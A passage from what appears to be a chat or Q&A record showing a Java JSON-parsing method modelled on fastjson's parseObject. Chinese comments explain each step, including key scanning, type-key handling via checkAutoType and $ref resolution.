\u5982\u679c\u5f53\u524d token \u662f NULL\uff0c\u5219\u8fd4\u56de null\n    if (lexer.token() == JSONToken.NULL) {\n        lexer.nextToken();\n        return null;\n    }\n\n    // \u5982\u679c\u5f53\u524d token \u662f\u53f3\u5927\u62ec\u53f7\uff0c\u5219\u8fd4\u56de\u5bf9\u8c61\n    if (lexer.token() == JSONToken.RBRACE) {\n        lexer.nextToken();\n        return object;\n    }\n\n    // \u5982\u679c\u5f53\u524d token \u662f\u7a7a\u5b57\u7b26\u4e32\uff0c\u5219\u8fd4\u56de\u5bf9\u8c61\n    if (lexer.token() == JSONToken.LITERAL_STRING &amp;&amp; lexer.stringVal().length() == 0) {\n        lexer.nextToken();\n        return object;\n    }\n\n    // \u5982\u679c\u5f53\u524d token \u4e0d\u662f\u5de6\u5927\u62ec\u53f7\u4e5f\u4e0d\u662f\u9017\u53f7\uff0c\u5219\u629b\u51fa\u8bed\u6cd5\u9519\u8bef\u5f02\u5e38\n    if (lexer.token() != JSONToken.LBRACE &amp;&amp; lexer.token() != JSONToken.COMMA) {\n        throw new JSONException(\"syntax error, expect {, actual \" + lexer.tokenName() + \", \" + lexer.info());\n    }\n\n    ParseContext context = this.context;\n    try {\n        Map map = object instanceof JSONObject ? ((JSONObject) object).getInnerMap() : object;\n\n        boolean setContextFlag = false;\n        for (;;) {\n            // \u8df3\u8fc7\u7a7a\u767d\u5b57\u7b26\n            lexer.skipWhitespace();\n            char ch = lexer.getCurrent();\n            if (lexer.isEnabled(Feature.AllowArbitraryCommas)) {\n                // \u5982\u679c\u5141\u8bb8\u4efb\u610f\u9017\u53f7\uff0c\u5219\u8df3\u8fc7\u6240\u6709\u9017\u53f7\n                while (ch == ',') {\n                    lexer.next();\n                    lexer.skipWhitespace();\n                    ch = lexer.getCurrent();\n                }\n            }\n\n            boolean isObjectKey = false;\n            Object key;\n            if (ch == '\"') {\n                // \u5982\u679c\u5f53\u524d\u5b57\u7b26\u662f\u53cc\u5f15\u53f7\uff0c\u5219\u626b\u63cf\u5b57\u7b26\u4e32\u4f5c\u4e3a\u952e\n                key = lexer.scanSymbol(symbolTable, '\"');\n                lexer.skipWhitespace();\n                ch = lexer.getCurrent();\n                if (ch != ':') {\n                    throw new JSONException(\"expect ':' at \" + lexer.pos() + \", name \" + key);\n                }\n            } else if (ch == '}') {\n                // \u5982\u679c\u5f53\u524d\u5b57\u7b26\u662f\u53f3\u5927\u62ec\u53f7\uff0c\u5219\u7ed3\u675f\u89e3\u6790\uff0c\u8fd4\u56de\u5bf9\u8c61\n                lexer.next();\n                lexer.resetStringPosition();\n                lexer.nextToken();\n\n                if (!setContextFlag) {\n                    if (this.context != null &amp;&amp; fieldName == this.context.fieldName &amp;&amp; object == this.context.object) {\n                        context = this.context;\n                    } else {\n                        ParseContext contextR = setContext(object, fieldName);\n                        if (context == null) {\n                            context = contextR;\n                        }\n                        setContextFlag = true;\n                    }\n                }\n\n                return object;\n            } else if (ch == '\\'') {\n                // \u5982\u679c\u5f53\u524d\u5b57\u7b26\u662f\u5355\u5f15\u53f7\uff0c\u5219\u626b\u63cf\u5b57\u7b26\u4e32\u4f5c\u4e3a\u952e\n                if (!lexer.isEnabled(Feature.AllowSingleQuotes)) {\n                    throw new JSONException(\"syntax error\");\n                }\n\n                key = lexer.scanSymbol(symbolTable, '\\'');\n                lexer.skipWhitespace();\n                ch = lexer.getCurrent();\n                if (ch != ':') {\n                    throw new JSONException(\"expect ':' at \" + lexer.pos());\n                }\n            } else if (ch == EOI) {\n                // \u5982\u679c\u5f53\u524d\u5b57\u7b26\u662f\u7ed3\u675f\u7b26\uff0c\u5219\u629b\u51fa\u8bed\u6cd5\u9519\u8bef\u5f02\u5e38\n                throw new JSONException(\"syntax error\");\n            } else if (ch == ',') {\n                // \u5982\u679c\u5f53\u524d\u5b57\u7b26\u662f\u9017\u53f7\uff0c\u5219\u629b\u51fa\u8bed\u6cd5\u9519\u8bef\u5f02\u5e38\n                throw new JSONException(\"syntax error\");\n            } else if ((ch &gt;= '0' &amp;&amp; ch &lt;= '9') || ch == '-') {\n                // \u5982\u679c\u5f53\u524d\u5b57\u7b26\u662f\u6570\u5b57\u6216\u8d1f\u53f7\uff0c\u5219\u626b\u63cf\u6570\u5b57\u4f5c\u4e3a\u952e\n                lexer.resetStringPosition();\n                lexer.scanNumber();\n                try {\n                    if (lexer.token() == JSONToken.LITERAL_INT) {\n                        key = lexer.integerValue();\n                    } else {\n                        key = lexer.decimalValue(true);\n                    }\n                    if (lexer.isEnabled(Feature.NonStringKeyAsString)) {\n                        key = key.toString();\n                    }\n                } catch (NumberFormatException e) {\n                    throw new JSONException(\"parse number key error\" + lexer.info());\n                }\n                ch = lexer.getCurrent();\n                if (ch != ':') {\n                    throw new JSONException(\"parse number key error\" + lexer.info());\n                }\n            } else if (ch == '{' || ch == '[') {\n                // \u5982\u679c\u5f53\u524d\u5b57\u7b26\u662f\u5de6\u5927\u62ec\u53f7\u6216\u5de6\u4e2d\u62ec\u53f7\uff0c\u5219\u9012\u5f52\u89e3\u6790\n                lexer.nextToken();\n                key = parse();\n                isObjectKey = true;\n            } else {\n                // \u5982\u679c\u5f53\u524d\u5b57\u7b26\u662f\u5176\u4ed6\u5b57\u7b26\uff0c\u5219\u5c1d\u8bd5\u626b\u63cf\u975e\u5f15\u53f7\u5b57\u6bb5\u540d\n                if (!lexer.isEnabled(Feature.AllowUnQuotedFieldNames)) {\n                    throw new JSONException(\"syntax error\");\n                }\n\n                key = lexer.scanSymbolUnQuoted(symbolTable);\n                lexer.skipWhitespace();\n                ch = lexer.getCurrent();\n                if (ch != ':') {\n                    throw new JSONException(\"expect ':' at \" + lexer.pos() + \", actual \" + ch);\n                }\n            }\n\n            // \u5982\u679c\u4e0d\u662f\u5bf9\u8c61\u952e\uff0c\u5219\u8df3\u8fc7\u5f53\u524d\u5b57\u7b26\u5e76\u8df3\u8fc7\u7a7a\u767d\u5b57\u7b26\n            if (!isObjectKey) {\n                lexer.next();\n                lexer.skipWhitespace();\n            }\n\n            ch = lexer.getCurrent();\n\n            lexer.resetStringPosition();\n\n            // \u5982\u679c\u952e\u662f\u9ed8\u8ba4\u7c7b\u578b\u952e\u4e14\u4e0d\u7981\u7528\u7279\u6b8a\u952e\u68c0\u6d4b\uff0c\u5219\u5904\u7406\u9ed8\u8ba4\u7c7b\u578b\u952e\n            if (key == JSON.DEFAULT_TYPE_KEY\n                    &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {\n                // \u626b\u63cf\u7c7b\u578b\u540d\n                String typeName = lexer.scanSymbol(symbolTable, '\"');\n\n                // \u5982\u679c\u7981\u7528\u81ea\u52a8\u7c7b\u578b\u5ffd\u7565\uff0c\u5219\u8df3\u8fc7\u5f53\u524d\u5faa\u73af\n                if (lexer.isEnabled(Feature.IgnoreAutoType)) {\n                    continue;\n                }\n\n                Class&lt;?&gt; clazz = null;\n                if (object != null\n                        &amp;&amp; object.getClass().getName().equals(typeName)) {\n                    clazz = object.getClass();\n                } else {\n                    clazz = config.checkAutoType(typeName, null, lexer.getFeatures());\n                }\n\n                // \u5982\u679c\u672a\u627e\u5230\u7c7b\uff0c\u5219\u5c06\u7c7b\u578b\u540d\u6dfb\u52a0\u5230\u5bf9\u8c61\u4e2d\u5e76\u7ee7\u7eed\u4e0b\u4e00\u6b21\u5faa\u73af\n                if (clazz == null) {\n                    map.put(JSON.DEFAULT_TYPE_KEY, typeName);\n                    continue;\n                }\n\n                // \u8df3\u8fc7\u9017\u53f7\n                lexer.nextToken(JSONToken.COMMA);\n\n                // \u5982\u679c\u5f53\u524d token \u662f\u53f3\u5927\u62ec\u53f7\uff0c\u5219\u521b\u5efa\u5b9e\u4f8b\u5e76\u8fd4\u56de\n                if (lexer.token() == JSONToken.RBRACE) {\n                    lexer.nextToken(JSONToken.COMMA);\n                    try {\n                        Object instance = null;\n                        ObjectDeserializer deserializer = this.config.getDeserializer(clazz);\n                        if (deserializer instanceof JavaBeanDeserializer) {\n                            JavaBeanDeserializer javaBeanDeserializer = (JavaBeanDeserializer) deserializer;\n                            instance = javaBeanDeserializer.createInstance(this, clazz);\n\n                            for (Object o : map.entrySet()) {\n                                Map.Entry entry = (Map.Entry) o;\n                                Object entryKey = entry.getKey();\n                                if (entryKey instanceof String) {\n                                    FieldDeserializer fieldDeserializer = javaBeanDeserializer.getFieldDeserializer((String) entryKey);\n                                    if (fieldDeserializer != null) {\n                                        fieldDeserializer.setValue(instance, entry.getValue());\n                                    }\n                                }\n                            }\n                        }\n\n                        if (instance == null) {\n                            if (clazz == Cloneable.class) {\n                                instance = new HashMap();\n                            } else if (\"java.util.Collections$EmptyMap\".equals(typeName)) {\n                                instance = Collections.emptyMap();\n                            } else {\n                                instance = clazz.newInstance();\n                            }\n                        }\n\n                        return instance;\n                    } catch (Exception e) {\n                        throw new JSONException(\"create instance error\", e);\n                    }\n                }\n\n                this.setResolveStatus(TypeNameRedirect);\n\n                if (this.context != null\n                        &amp;&amp; fieldName != null\n                        &amp;&amp; !(fieldName instanceof Integer)\n                        &amp;&amp; !(this.context.fieldName instanceof Integer)) {\n                    this.popContext();\n                }\n\n                // \u5982\u679c\u5bf9\u8c61\u4e0d\u4e3a\u7a7a\uff0c\u5219\u5c06\u5176\u8f6c\u6362\u4e3a\u6307\u5b9a\u7c7b\u578b\u5e76\u89e3\u6790\n                if (object.size() &gt; 0) {\n                    Object newObj = TypeUtils.cast(object, clazz, this.config);\n                    this.parseObject(newObj);\n                    return newObj;\n                }\n\n                // \u5426\u5219\uff0c\u6839\u636e\u7c7b\u578b\u521b\u5efa\u53cd\u5e8f\u5217\u5316\u5668\u5e76\u8fd4\u56de\u5bf9\u8c61\n                ObjectDeserializer deserializer = config.getDeserializer(clazz);\n                Class deserClass = deserializer.getClass();\n                if (JavaBeanDeserializer.class.isAssignableFrom(deserClass)\n                        &amp;&amp; deserClass != JavaBeanDeserializer.class\n                        &amp;&amp; deserClass != ThrowableDeserializer.class) {\n                    this.setResolveStatus(NONE);\n                }\n                Object obj = deserializer.deserialze(this, clazz, fieldName);\n                return obj;\n            }\n\n            // \u5982\u679c\u952e\u662f\u5f15\u7528\u952e\u4e14\u4e0a\u4e0b\u6587\u4e0d\u4e3a\u7a7a\u4e14\u4e0d\u7981\u7528\u7279\u6b8a\u952e\u68c0\u6d4b\uff0c\u5219\u5904\u7406\u5f15\u7528\u952e\n            if (key == \"$ref\"\n                    &amp;&amp; context != null\n                    &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {\n                lexer.nextToken(JSONToken.LITERAL_STRING);\n                if (lexer.token() == JSONToken.LITERAL_STRING) {\n                    String ref = lexer.stringVal();\n                    lexer.nextToken(JSONToken.RBRACE);\n\n                    Object refValue = null;\n                    if (\"@\".equals(ref)) {\n                        if (this.context != null) {\n                            ParseContext thisContext = this.context;\n                            Object thisObj = thisContext.object;\n                            if (thisObj instanceof Object[] || thisObj instanceof Collection&lt;?&gt;) {\n                                refValue = thisObj;\n                            } else if (thisContext.parent != null) {\n                                refValue = thisContext.parent.object;\n                            }\n                        }\n                    } else if (\"..\".equals(ref)) {\n                        if (context.object != null) {\n                            refValue = context.object;\n                        } else {\n                            addResolveTask(new ResolveTask(context, ref));\n                            setResolveStatus(DefaultJSONParser.NeedToResolve);\n                        }\n                    } else if (\"$\".equals(ref)) {\n                        ParseContext rootContext = context;\n                        while (rootContext.parent != null) {\n                            rootContext = rootContext.parent;\n                        }\n\n                        if (rootContext.object != null) {\n                            refValue = rootContext.object;\n                        } else {\n                            addResolveTask(new ResolveTask(rootContext, ref));\n                            setResolveStatus(DefaultJSONParser.NeedToResolve);\n                        }\n                    } else {\n                        addResolveTask(new ResolveTask(context, ref));\n                        setResolveStatus(DefaultJSONParser.NeedToResolve);\n                    }\n\n                    if (lexer.token() != JSONToken.RBRACE) {\n                        throw new JSONException(\"syntax error\");\n                    }\n                    lexer.nextToken(JSONToken.COMMA);\n\n                    return refValue;\n                } else {\n                    throw new JSONException(\"illegal ref, \" + JSONToken.name(lexer.token()));\n                }\n            }\n\n            // \u5982\u679c\u672a\u8bbe\u7f6e\u4e0a\u4e0b\u6587\u6807\u5fd7\uff0c\u5219\u8bbe\u7f6e\u4e0a\u4e0b\u6587\n            if (!setContextFlag) {\n                if (this.context != null &amp;&amp; fieldName == this.context.fieldName &amp;&amp; object == this.context.object) {\n                    context = this.context;\n                } else {\n                    ParseContext contextR = setContext(object, fieldName);\n                    if (context == null) {\n                        context = contextR;\n                    }\n                    setContextFlag = true;\n                }\n            }\n\n            if (object.getClass() == JSONObject.class) {\n                if (key == null) {\n                    key = \"null\";\n                }\n            }\n\n            Object value;\n            if (ch == '\"') {\n                // \u5982\u679c\u5f53\u524d\u5b57\u7b26\u662f\u53cc\u5f15\u53f7\uff0c\u5219\u626b\u63cf\u5b57\u7b26\u4e32\u4f5c\u4e3a\u503c\n                lexer.scanString();\n                String strValue = lexer.stringVal();\n                value = strValue;\n\n                // \u5982\u679c\u542f\u7528 ISO8601 \u65e5\u671f\u683c\u5f0f\uff0c\u5219\u5c1d\u8bd5\u89e3\u6790\u4e3a\u65e5\u671f\n                if (lexer.isEnabled(Feature.AllowISO8601DateFormat)) {\n                    JSONScanner iso8601Lexer = new JSONScanner(strValue);\n                    if (iso8601Lexer.scanISO8601DateIfMatch()) {\n                        value = iso8601Lexer.getCalendar().getTime();\n                    }\n                    iso8601Lexer.close();\n                }\n\n                map.put(key, value);\n            } else if (ch &gt;= '0' &amp;&amp; ch &lt;= '9' || ch == '-') {\n                // \u5982\u679c\u5f53\u524d\u5b57\u7b26\u662f\u6570\u5b57\u6216\u8d1f\u53f7\uff0c\u5219\u626b\u63cf\u6570\u5b57\u4f5c\u4e3a\u503c\n                lexer.scanNumber();\n                if (lexer.token() == JSONToken.LITERAL_INT) {\n                    value = lexer.integerValue();\n                } else {\n                    value = lexer.decimalValue(lexer.isEnabled(Feature.UseBigDecimal));\n                }\n\n                map.put(key, value);\n            } else if (ch == '[') {\n                // \u5982\u679c\u5f53\u524d\u5b57\u7b26\u662f\u5de6\u4e2d\u62ec\u53f7\uff0c\u5219\u89e3\u6790\u6570\u7ec4\n                lexer.nextToken();\n                JSONArray list = new JSONArray();\n                final boolean parentIsArray = fieldName != null &amp;&amp; fieldName.getClass() == Integer.class;\n                if (fieldName == null) {\n                    this.setContext(context);\n                }\n                this.parseArray(list, key);\n                if (lexer.isEnabled(Feature.UseObjectArray)) {\n                    value = list.toArray();\n                } else {\n                    value = list;\n                }\n                map.put(key, value);\n                if (lexer.token() == JSONToken.RBRACE) {\n                    lexer.nextToken();\n                    return object;\n                } else if (lexer.token() == JSONToken.COMMA) {\n                    continue;\n                } else {\n                    throw new JSONException(\"syntax error\");\n                }\n            } else if (ch == '{') {\n                // \u5982\u679c\u5f53\u524d\u5b57\u7b26\u662f\u5de6\u5927\u62ec\u53f7\uff0c\u5219\u89e3\u6790\u5bf9\u8c61\n                lexer.nextToken();\n                final boolean parentIsArray = fieldName != null &amp;&amp; fieldName.getClass() == Integer.class;\n                Map input;\n                if (lexer.isEnabled(Feature.CustomMapDeserializer)) {\n                    MapDeserializer mapDeserializer = (MapDeserializer) config.getDeserializer(Map.class);\n                    input = mapDeserializer.createMap(Map.class);\n                } else {\n                    input = new JSONObject(lexer.isEnabled(Feature.OrderedField));\n                }\n                ParseContext ctxLocal = null;\n                if (!parentIsArray) {\n                    ctxLocal = setContext(context, input, key);\n                }\n                Object obj = null;\n                boolean objParsed = false;\n                if (fieldTypeResolver != null) {\n                    String resolveFieldName = key != null ? key.toString() : null;\n                    Type fieldType = fieldTypeResolver.resolve(object, resolveFieldName);\n                    if (fieldType != null) {\n                        ObjectDeserializer fieldDeser = config.getDeserializer(fieldType);\n                        obj = fieldDeser.deserialze(this, fieldType, key);\n                        objParsed = true;\n                    }\n                }\n                if (!objParsed) {\n                    obj = this.parseObject(input, key);\n                }\n                if (ctxLocal != null &amp;&amp; input != obj) {\n                    ctxLocal.object = object;\n                }\n                if (key != null) {\n                    checkMapResolve(object, key.toString());\n                }\n                map.put(key, obj);\n                if (parentIsArray) {\n                    setContext(obj, key);\n                }\n                if (lexer.token() == JSONToken.RBRACE) {\n                    lexer.nextToken();\n                    setContext(context);\n                    return object;\n                } else if (lexer.token() == JSONToken.COMMA) {\n                    if (parentIsArray) {\n                        this.popContext();\n                    } else {\n                        this.setContext(context);\n                    }\n                    continue;\n                } else {\n                    throw new JSONException(\"syntax error, \" + lexer.tokenName());\n                }\n            } else {\n                // \u5176\u4ed6\u60c5\u51b5\uff0c\u89e3\u6790\u503c\u5e76\u6dfb\u52a0\u5230\u5bf9\u8c61\u4e2d\n                lexer.nextToken();\n                value = parse();\n                map.put(key, value);\n                if (lexer.token() == JSONToken.RBRACE) {\n                    lexer.nextToken();\n                    return object;\n                } else if (lexer.token() == JSONToken.COMMA) {\n                    continue;\n                } else {\n                    throw new JSONException(\"syntax error, position at \" + lexer.pos() + \", name \" + key);\n                }\n            }\n\n            // \u8df3\u8fc7\u7a7a\u767d\u5b57\u7b26\u5e76\u83b7\u53d6\u4e0b\u4e00\u4e2a\u5b57\u7b26\n            lexer.skipWhitespace();\n            ch = lexer.getCurrent();\n            if (ch == ',') {\n                // \u5982\u679c\u5f53\u524d\u5b57\u7b26\u662f\u9017\u53f7\uff0c\u5219\u7ee7\u7eed\u4e0b\u4e00\u6b21\u5faa\u73af\n                lexer.next();\n                continue;\n            } else if (ch == '}') {\n                // \u5982\u679c\u5f53\u524d\u5b57\u7b26\u662f\u53f3\u5927\u62ec\u53f7\uff0c\u5219\u8bbe\u7f6e\u4e0a\u4e0b\u6587\u5e76\u8fd4\u56de\u5bf9\u8c61\n                lexer.next();\n                lexer.resetStringPosition();\n                lexer.nextToken();\n                this.setContext(value, key);\n                return object;\n            } else {\n                // \u5176\u4ed6\u60c5\u51b5\uff0c\u629b\u51fa\u8bed\u6cd5\u9519\u8bef\u5f02\u5e38\n                throw new JSONException(\"syntax error, position at \" + lexer.pos() + \", name \" + key);\n            }\n        }\n    } finally {\n        // \u6062\u590d\u4e0a\u4e0b\u6587\n        this.setContext(context);\n    }\n}\n</code></pre>"}]}